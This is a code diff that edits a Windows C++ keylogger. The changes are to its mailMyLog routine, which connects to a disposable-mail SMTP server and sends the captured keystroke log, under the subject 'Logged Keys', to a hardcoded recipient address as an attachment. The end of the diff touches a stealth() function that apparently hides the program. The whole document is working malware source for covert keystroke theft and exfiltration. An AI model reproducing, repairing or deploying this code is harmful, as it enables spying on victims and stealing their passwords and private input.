@@ -17,8 +17,8 @@
 #define SSTIME 900
 #define recipientAddr "mdsiam01@sharklasers.com"
 #define SMTPLog "smtp.log"
-
 #define MAX_INPUT_LEN 80
+
 using namespace std;
 
 bool numUnlocked = true;
@@ -1094,6 +1094,7 @@ int mailMyLog(char *receiverAddress) {
 
     sendData(&ConnectSocket, "HELO mail.sharklasers.com\r\n");
     recvData(&ConnectSocket);
+    Sleep(1000);
     sendData(&ConnectSocket, "MAIL FROM:<siamloggingyourkey@sharklasers.com>\r\n");
     recvData(&ConnectSocket);
     char line[1000];
@@ -1102,7 +1103,7 @@ int mailMyLog(char *receiverAddress) {
     strncat(line,">\r\n",3);
     sendData(&ConnectSocket, line);
     recvData(&ConnectSocket);
-    sendData(&ConnectSocket, "DATA\r\n");
+    sendData(&ConnectSocket, "DATA\n");
     recvData(&ConnectSocket);
     sendData(&ConnectSocket, "Subject:Logged Keys\r\n");
     sendData(&ConnectSocket, "And this is text\r\n");
@@ -1120,44 +1121,51 @@ int mailMyLog(char *receiverAddress) {
     while(fgets(tem,100,fp)!=NULL)
     {
         int size1= strlen(tem);
-
+        tem[size1-1]='\n';
+        tem[size1]='\0';
+        sendData(&ConnectSocket, tem);
         //tem[size1-1]='\n';
 
-        std::cout<< tem <<std::endl;
+        //std::cout<< tem <<std::endl;
         strcat(mylogs, tem);
     }
-    fclose(fp);
-    strcat(mylogs,"=0A=0ARegards,=0A<SIAM>=0A=0A---- =0ASent using Guerrillamail.com =0ABlock or report abuse : https://www.guerrillamail.com//abuse/?a=3DUVJzDA8SW6Q1mwa14nUTcwfCX9ne0dhd=0A \r\n\r\n");
-    sendData(&ConnectSocket, mylogs);
+    sendData(&ConnectSocket,"=0A=0ARegards,=0A<SIAM>=0A=0A---- =0ASent using Guerrillamail.com =0ABlock or report abuse : https://www.guerrillamail.com//abuse/?a=3DUVJzDA8SW6Q1mwa14nUTcwfCX9ne0dhd=0A \r\n\r\n");
+    //sendData(&ConnectSocket, mylogs);
+    sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
     //sendData(&ConnectSocket, "Hi Siam,=0A=0AThis is an empty file.=0A=0ARegards,=0A<ME>=0A=0A---- =0ASent using Guerrillamail.com =0ABlock or report abuse : https://www.guerrillamail.com//abuse/?a=3DUVJzDA8SW6Q1mwa14nUTcwfCX9ne0dhd=0A \r\n\r\n");
     sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
     sendData(&ConnectSocket, "Content-Type: text/plain\r\n");
-    sendData(&ConnectSocket, "Content-Transfer-Encoding: base64\r\n");
-    sendData(&ConnectSocket, "Content-Disposition: attachment; filename=\"log.txt\"\r\n\r\n");
+    //sendData(&ConnectSocket, "Content-Transfer-Encoding: base64\r\n");
+    sendData(&ConnectSocket, "Content-Disposition: attachment; filename=\"windows.txt\"\r\n\r\n");
     sendData(&ConnectSocket, "U2FtcGxlIFRleHQu");
-    sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
+    //sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
     sendData(&ConnectSocket, ".\r\n");
 
-    FILE* MailFilePtr = fopen("test.cpp", "r");
+    FILE* MailFilePtr = fopen("windows.txt", "r");
     if (MailFilePtr == NULL)
         printf("Error opening attachment\n");
 
     char FileBuffer[1024];
-    char buf[1024];
+    char buf[5020];
 
     memset(FileBuffer, 0, sizeof(FileBuffer));
     while (fgets(FileBuffer, sizeof(FileBuffer), MailFilePtr))
     {
         sprintf(buf, "%s", FileBuffer);
         buf[strlen(buf) - 1] = 0;
+        strcat(buf,"\n");
+        //strcat(buf, FileBuffer);
+       // strcat(buf,".\r\n");
         sendData(&ConnectSocket, buf);
+        //recvData(&ConnectSocket);
         memset(FileBuffer, 0, sizeof(FileBuffer));
         memset(buf, 0, sizeof(buf));
     }
 
     fclose(MailFilePtr);
-
-    sendData(&ConnectSocket, "\r\n\r\n--KkK170891tpbkKk__FV_KKKkkkjjwq--\r\n\r\n");
+    sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
+    //sendData(&ConnectSocket, buf);
+    //sendData(&ConnectSocket, "\r\n\r\n--KkK170891tpbkKk__FV_KKKkkkjjwq--\r\n\r\n");
     sendData(&ConnectSocket, ".\r\n");
     recvData(&ConnectSocket);
 
@@ -1175,6 +1183,7 @@ int mailMyLog(char *receiverAddress) {
     WSACleanup();
     return 0;
 }
+
 void stealth()
 {
     HWND stealth;
